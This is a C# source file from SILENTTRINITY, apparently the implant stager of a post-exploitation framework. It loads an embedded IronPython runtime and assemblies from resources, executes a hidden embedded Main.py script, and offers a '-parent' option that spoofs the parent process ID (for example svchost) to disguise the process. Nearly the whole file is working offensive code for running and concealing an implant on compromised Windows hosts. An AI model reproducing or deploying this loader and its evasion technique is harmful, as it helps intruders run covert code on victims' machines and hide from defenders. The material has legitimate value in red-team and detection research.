using System;
using IronPython.Hosting;
using IronPython.Modules;
//using IronPython.Runtime;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Scripting.Hosting;
using Microsoft.Scripting.Utils;
using System.Collections.Generic;
//using System.Diagnostics;
//using System.Windows.Forms;

namespace SILENTTRINITY
{

    public class Runtime
    {

        // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
        // http://ironpython.net/blog/2012/07/07/whats-new-in-ironpython-273.html
        // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/

        public dynamic CreateEngine()
        {
            ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(options: GetRuntimeOptions());
            var pyRuntime = new ScriptRuntime(setup);
            ScriptEngine engineInstance = Python.GetEngine(pyRuntime);

            AddPythonLibrariesToSysMetaPath(engineInstance);

            return engineInstance;
        }

        public void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
        {
            Assembly asm = GetType().Assembly;
            var resQuery =
                from name in asm.GetManifestResourceNames()
                where name.ToLowerInvariant().EndsWith(".zip")
                select name;
           string resName = resQuery.Single();
           Console.WriteLine("Found Python embedded stdlib: {0}", resName);
           var importer = new ResourceMetaPathImporter(asm, resName);
           dynamic sys = engineInstance.GetSysModule();
           sys.meta_path.append(importer);
           sys.path.append(importer);
           //List metaPath = sys.GetVariable("meta_path");
           //metaPath.Add(importer);
           //sys.SetVariable("meta_path", metaPath);
        }

        private static IDictionary<string, object> GetRuntimeOptions()
        {
            var options = new Dictionary<string, object>
            {
                ["Debug"] = false
            };
            return options;
        }

        public static void DumpEmbeddedResources()
        {
            string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
            foreach (string resourceName in resourceNames)
            {
                Console.WriteLine(resourceName);
            }
        }

        public static void Main(string[] args)
        {

            Console.WriteLine("Available embedded resources:");
            DumpEmbeddedResources();
            Console.WriteLine("\n");

            AppDomain.CurrentDomain.AssemblyResolve += (sender, resourceargs) => {

                String assemblyName = new AssemblyName(resourceargs.Name).Name;
                Console.WriteLine("Trying to resolve {0}", assemblyName);
                String resourceName = "SILENTTRINITY.Resources." + assemblyName + ".dll";
                // Console.WriteLine("resourceName: {0}", resourceName);

                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {

                    Byte[] assemblyData = new Byte[stream.Length];

                    stream.Read(assemblyData, 0, assemblyData.Length);
                    
                    return Assembly.Load(assemblyData);

                }
  
            };

            // Get Assembly Path 
            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
            //string lpApplicationName = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
            string lpApplicationName = Assembly.GetEntryAssembly().Location;

            if (args.Length == 1 && args[0].ToLower() == "-parent")
            {
                Console.WriteLine("\n [+] Please enter a valid Parent Process name.");
                Console.WriteLine(" [+] For Example: {0} -parent svchost", lpApplicationName);
                return;
            }
            else if (args.Length == 2)
            {
                if (args[0].ToLower() == "-parent" && args[1] != null)
                {
                    string PPIDName = args[1];
                    int NewPPID = 0;

                    // Find PID from our new Parent and start new Process with new Parent ID
                    NewPPID = ProcessCreator.NewParentPID(PPIDName);
                    if (NewPPID == 0)
                    {
                        Console.WriteLine("\n [!] No suitable Process ID Found...");
                        return;
                    }

                    if (!ProcessCreator.CreateProcess(NewPPID, lpApplicationName, null))
                    {
                        Console.WriteLine("\n [!] Oops PPID Spoof failed...");
                        return;
                    }
                }
            }
            else
            {
                CreateRuntime();
            }

            return;
        }

        public static void CreateRuntime()
        {

                Runtime runtime = new Runtime();
                var myScript = (string)null;

                try
                {

                    myScript = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("SILENTTRINITY.Resources.Main.py")).ReadToEnd();

                }
                catch
                {
                    Console.WriteLine("Error accessing embedded Main.py file");
                }

                ScriptEngine engine = runtime.CreateEngine();
                engine.Execute(myScript);

        }
    }
}